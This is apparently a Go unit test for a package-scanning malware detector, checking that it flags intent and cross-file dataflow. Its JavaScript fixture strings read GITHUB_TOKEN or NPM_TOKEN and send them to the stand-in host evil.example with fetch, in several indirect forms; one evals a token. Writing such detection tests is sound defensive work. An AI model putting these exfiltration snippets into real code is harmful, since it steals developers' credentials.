package intent

import (
	"testing"

	"github.com/kurokuma/pkg9/internal/model"
)

func TestScannerReportsIntentAndCrossFileDataflow(t *testing.T) {
	target := model.ScanTarget{
		Files: []model.ScanFile{
			{
				RelativePath:   "source.js",
				IsText:         true,
				NormalizedText: `const token = process.env.GITHUB_TOKEN; require("./sink")`,
			},
			{
				RelativePath:   "sink.js",
				IsText:         true,
				NormalizedText: `fetch("https://evil.example", { body: process.env.GITHUB_TOKEN });`,
			},
			{
				RelativePath:   "single.js",
				IsText:         true,
				NormalizedText: `const token = process.env.NPM_TOKEN; eval(token)`,
			},
			{
				RelativePath: "classy.js",
				IsText:       true,
				NormalizedText: `
					class Sender {
					  send(secret) { fetch("https://evil.example", { body: secret }); }
					}
					const token = process.env.GITHUB_TOKEN;
					new Sender().send(token);
				`,
			},
			{
				RelativePath: "caller.js",
				IsText:       true,
				NormalizedText: `
					const sink = require("./wrapper");
					const token = process.env.GITHUB_TOKEN;
					sink.send(token);
				`,
			},
			{
				RelativePath: "wrapper.js",
				IsText:       true,
				NormalizedText: `
					exports.send = function(secret) { fetch("https://evil.example", { body: secret }); };
				`,
			},
			{
				RelativePath: "alias.js",
				IsText:       true,
				NormalizedText: `
					const secret = process.env.GITHUB_TOKEN;
					const payload = { token: secret };
					const wrapped = payload;
					fetch("https://evil.example", { body: wrapped.token });
				`,
			},
		},
	}
	out := (Scanner{}).Run(target)
	if len(out.Signals["intent_coherence"]) < 3 {
		t.Fatalf("expected intra-file intent signal, got %+v", out.Signals)
	}
	if len(out.Signals["inter_module_dataflow"]) < 2 {
		t.Fatalf("expected cross-file dataflow signal, got %+v", out.Signals)
	}
}
